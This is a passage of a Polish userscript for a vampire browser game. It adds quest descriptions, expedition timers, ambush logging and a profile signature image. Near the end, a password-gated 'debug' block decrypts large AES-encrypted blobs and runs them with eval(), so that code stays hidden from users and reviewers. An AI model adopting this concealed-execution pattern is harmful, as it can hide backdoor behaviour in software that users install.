        juenOpis('Każdy szanujący się wampir powinien posiadać kolekcję artefaktów. Ukończ wszystkie Dalekie Wyprawy. ', 'Każdy szanujący się wampir powinien posiadać kolekcję artefaktów. Ukończ wszystkie Dalekie Wyprawy.');
        juenOpis('Tylko najlepsi z najlepszych są warci tego zadania i tylko oni posiadają przedmioty Mocy. Odbądź udaną Pielgrzymkę w Nieznane. ', 'Wykonaj jedną udaną Pielgrzymkę w nieznane ');
        juenOpis('W naszym kwadracie grasuje wataha wilkołaków. Trzeba je zabić, atakując je we własnej kryjówce. ', 'Załóż oblężenie na swój kwadrat [urząd zasadzkę --> przygotuj oblężenie]. Warto jest zabrać ze sobą klanowiczy.');
        juenOpis('Pieniądze i handel bronią to czynniki, które pozwolą Ci przetrwać. Osiągnij stabilizację, rozbudowując Dom Publiczny na 10 poziom oraz stawiając Stary Rynek.', 'Wybuduj Dom publiczny na poziom 10 oraz postaw budynek Stary Rynek. Jeśli już masz te budynki, wystarczy podnieść jeden z nich o poziom ');
        juenOpis('Urodziłeś się po to, by awansować. Udowodnij to, awansując do IV strefy.', 'Załóż oblężenie na kwadrat w IV strefie. Zajmując terytorium wykonasz to zadanie.');
        juenOpis('Urodziłaś się po to, by awansować. Udowodnij to, awansując do IV strefy.', 'Załóż oblężenie na kwadrat w IV strefie. Zajmując terytorium wykonasz to zadanie.');
        juenOpis('Rozszerz swoje wpływy w świecie mroku zdobywając wasala (możesz tego dokonać korzystając z linka ref. w Sali Tronowej). ', 'Zaproś przyjaciela do gry używając linku referencyjnego z Sali Tronowej.');
        // moria/necro mix (+s1)
        juenOpis('Pieniądze i handel bronią to czynniki, które pozwolą Ci przetrwać. Osiągnij stabilizację, rozbudowując Dom Publiczny na 8 poziom oraz Postój Taxi na 2 poziom.', 'Wybuduj Dom publiczny na poziom 8 oraz Postój Taxi na poziom 2. Jeśli już masz te budynki, wystarczy podnieść jeden z nich o poziom');
        juenOpis('Prestiż wśród wampirów to nie tylko bogactwo i władza. Tylko wielki wojownik wzbudza prawdziwy respekt.', 'Wygraj 15 walk pod rząd urządzając zasadzkę. Walki w obronie się nie liczą.');
        juenOpis('Pomimo ostrzeżeń doradców, wyprawiasz się czasami na samotne spacery w okolice miasta. Przypominają Ci czasy, kiedy byłeś młodym wampirem, który przybył do miasta marząc o sławie i władzy.', 'Należy pokonać assasyna na bliskiej wyprawie');
        juenOpis('Pomimo ostrzeżeń doradców, wyprawiasz się czasami na samotne spacery w okolice miasta. Przypominają Ci czasy, kiedy byłaś młodym wampirem, który przybył do miasta marząc o sławie i władzy.', 'Należy pokonać assasyna na bliskiej wyprawie');
        juenOpis('Zdobądź 89 poziom.', 'Zdobądź 89 poziom.');
        juenOpis('Wszystkie zagadkowe historie nagle stały się jasne. U wrót miasta stanęła armia potężnych magów, mających przed sobą tylko jeden cel - doszczętne zniszczenie miasta i "wyzwolenie" ludzi od gnębiących ich wampirów. Czas, by wszystkie wampiry zjednoczyły się w walce przeciwko wspólnemu wrogowi.', 'Oblężenie na własny kwadrat przeciw Bractwu Chaosu.');
      }
      if (a == '?a=profile') {
        ref = document.getElementsByClassName('content-mid') [0].getElementsByTagName('A') [1].innerHTML;
        num = ref.substring(ref.search('uid=') + 4);
        div = document.getElementsByClassName('profile') [0];
        div.innerHTML += '<BR>Sygnaturka <a href="https://zk.nakoz.org/' + num + id + 'p1.png">https://zk.nakoz.org/' + num + id + 'p1.png</a>:<br><img width="328" src="https://zk.nakoz.org/' + num + id + 'p1.png">';
      }
      if (a == '?a=quest') {
        if (document.getElementById('quest_timeleft')) {
          czas = Math.floor(Date.now() / 1000);
          var mid = '?a=msg&do=view&mid=' + document.getElementsByTagName('body') [0].innerHTML.substring(9 + document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'), document.getElementsByTagName('body') [0].innerHTML.indexOf(')', document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'))) + '&type=1';
          var przeliczone = 0;
          var p = document.getElementById('quest_timeleft').innerText.split(':');
          przeliczone = parseInt(p[2]) + parseInt(p[1] * 60) + parseInt(p[0] * 60 * 60);
          czas += przeliczone;
          GM_setValue(id + 'UM_wyprawa', czas);
          GM_setValue(id + 'UM_mid', mid);
        } else {
          GM_setValue(id + 'UM_wyprawa', 0);
        }        //	version = document.getElementById('content-mid');
        //		ver2 = document.createElement('SPAN');
        //		ver2.innerHTML='<br><center><iframe scrolling=no src="http://mega.szajb.us/juenizer/unmod/ver.php?mini=yes&ver='+UM_VER+'" width="240" style="margin-top: -20px;" frameborder=0 height="28"></iframe></center>';
        //	version.insertBefore(ver2,version.firstChild);

      }
      test = GM_getValue(id + 'UM_wyprawa', 0);
      if (test > 0) {
        if (test - Math.floor(Date.now() / 1000) > 0) {
          setTimeout(function () {
            if (GM_getValue(id + 'UM_wyprawa', 0)) {
              notification('Wyprawa zakończona');
              GM_setValue(id + 'UM_wyprawa', 0);
            }
          }, (test - Math.floor(Date.now() / 1000)) * 1000);
        } else {
          GM_setValue(id + 'UM_wyprawa', 0);
        }
      }
      if (a == '?a=ambush') {
        test = document.getElementsByClassName('players');
        if (test.length) {
          uid = test[0].href.substr(test[0].href.search('uid=') + 4);
          sid = 6;
          for (sid = 6; sid < document.getElementsByTagName('script').length; sid++) {
            if (document.getElementsByTagName('script') [sid].innerHTML.search('\'atkTimeLeft\', ') != - 1) break;
          }
          if (sid !== document.getElementsByTagName('script').length) {
            if (document.getElementsByTagName('script') [sid].innerHTML.search('\'atkTimeLeft\', ') != - 1) {
              suid = document.getElementsByTagName('table');
              for (i = 0; i < suid.length; i++) {
                if (suid[i].innerHTML.search('VS.') > 0) {
                  pl = suid[i].getElementsByClassName('players') [0].href;
                  uid = pl.substr(pl.search('uid=') + 4);
                }
              }
              var mid = '?a=msg&do=view&mid=' + document.getElementsByTagName('body') [0].innerHTML.substring(9 + document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'), document.getElementsByTagName('body') [0].innerHTML.indexOf(')', document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'))) + '&type=1';
              //				mid = document.getElementsByTagName('script')[sid].innerHTML.substr(document.getElementsByTagName('script')[sid].innerHTML.search('a=msg&do=view&mid=')+18);
              //			mid = mid.substr(0,mid.search('"'));
              teraz = new Date();
              teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
              teraz = teraz.getDate() + '/' + (teraz.getMonth() + 1) + '/' + teraz.getFullYear();
              if (GM_getValue(id + 'UM_1_' + uid, 'A:B') != mid + ':' + teraz && GM_getValue(id + 'UM_2_' + uid, 'A:B') != mid + ':' + teraz) {
                GM_setValue(id + 'UM_2_' + uid, GM_getValue(id + 'UM_1_' + uid, 'A:B'));
                GM_setValue(id + 'UM_1_' + uid, mid + ':' + teraz);
              }
            }
          }
        }
      }      /*
	if ("?a=msg&do=view&mid="==a.substring(0,19) && GM_getValue(id+'UM_OP_wyparch',true)) {
		mid = a.replace('?a=msg&do=view&mid=','').replace('&type=1','');
		c = document.getElementById('content-mid');
		if (c.innerHTML.search("msg-content msg-quest")>0) {
			divs = c.getElementsByTagName('DIV');
			for (i=0; i<divs.length; i++) {
				if (divs[i].style.marginTop=="10px") {
					//raport z wyprawy
					link = divs[i].getElementsByTagName('A')[0].innerHTML;
					key = link.substring(link.search('key=')+4);
					c.innerHTML+='<iframe width=100% frameborder="0" height="28" scrolling="no" src="http://mega.szajb.us/juenizer/unmod/staty_wypraw.php?id='+id+'&key='+key+'&mid='+mid+'"></iframe>';
				}
			}
		}
	}
	*/
      // dupa, pozdrawiam czytaczy kodów ;)
      // dodatkowe funkcje do debugowania unmoda! wylacznie na haslo

      if (GM_getValue(id + 'UM_pass', '').length >= 7) {
        encrypted = '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';
        var decrypted = CryptoJS.AES.decrypt(encrypted, GM_getValue(id + 'UM_pass', '')).toString(CryptoJS.enc.Utf8);



        eval(decrypted);
        encrypted = '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';
        var decrypted = CryptoJS.AES.decrypt(encrypted, GM_getValue(id + 'UM_pass', '')).toString(CryptoJS.enc.Utf8).replace('alert(1)', '');
        eval(decrypted);
        encrypted = 'U2FsdGVkX18ZQgCptiwKudZ9EZLg7Ur3wpY6Ogga3ZI0gy2wdbvB9ZfIYvEzFtp6hSbJCBvnz8Vh9Dk/cO0xxIc6Nu/W4XqBlUnWTaxaOk196kAnAKPnrY/Pm4uthfP/PpxVeplOyUSD4FQb2miB/4a5CEalP/mPEqt977ydmaOZ/N2VyXIjhdVjbuw8f96+eOyQUZi3BOG3RJT5PfAhoadL/3+TBfQvEOJFF+/mO/K+dK8S+4y3fq6gql0R/2T8TI0X3XRjDzTlI6l452ARpScpkNBiqAh/pk3/q3CxkTTbS2MDO4/m64upUMKbZRkQstkN4BjXiM6uGrAxMOUmez/yaBsdmSnpcZ4TaLUSP/Qb5bQQqtkD/WugbTRsr+RghWVzJ+z9juOC8BYn5qE5j5C1P7tZgHHSwpk2fRwSDlJCStEVO4Wixmg1+fPlhw6hUIXM449vVyNqu3q1tp4/d0tTby4AzuXbCvnQbaTUcCiotG4UxEBPv5uVXgJ9a9cVa9/OsOKctTo9erlhaFLM6GFyz0DeEmwJc83zep7qBasVw4vZdPqzq1rNlzedjRfOlurwwnojafD2k6zlm6G9tQJVMk7fxUHfbSCyhLyx2/pHOXtwE1Md5OGlTsnTtg2eJHLRd07HhZfUuHOSxoULi58fnZCF/tD5DuGvyoK3imBLCwlYUgmqX+RYH88lJPA0d+B3Qt+bzLLutYtOwFfc7GU8xLzYS7jR6/NoPLFmOFRl6Pjj8svNLMcxCIpfewAs2tEpiuTFAA+bddnaOP1td1C753FFtlr7gumeu9DdP5/oIkr7AdSYn9aTS3WEk4Fc3zvSY1oI4++3tINCktmRzJOWoppm3rvet0semM60SfSdy76IawUeEMHfr9ngbEOCv4ZNi//vDSUSLGQojyL7rhidSUp9b+vHqPVTIBapF+IaVTId5m1o5XuzRCGZpqNonmM383wVhMkIg5dgyiFOQERWSsAHyTMEdiU2/DHd/IRFcgFVtL0bB9XKWkpSN4woYtMOwWXc9BZW39iDbvexdhNSLskxsCiPNVmG2kcnD78mspxgSZUgbZVUYWo9LQNVCKJMtkeOEoCp4cXU0+GNFNqwEk6mG0iNqaYvXZ5o+d+dCF/DNsEj9QK4qk4yhgj3VIEGiA5hEhR4Q8vcb8lLtJiV8M8DYN+LyOfjYpRFhT5BW1VU/1jovB50lPIqvjL9wXCaP1VaHaAYiScEw76c9wQfgbnLHbBiKRz1MumACnX0uF5f4E0AAWCPNfzYAWkp1UUC7f7afovGt3lUOf4JplzcNef3PbroYsq1wciBhuDTSXkEqMDQLpKv2zBeVff3FcA7OfTtdzONYASrgi7SiXIzthV8WGtblsrbgCO+HYMG8G5oB5ptGw4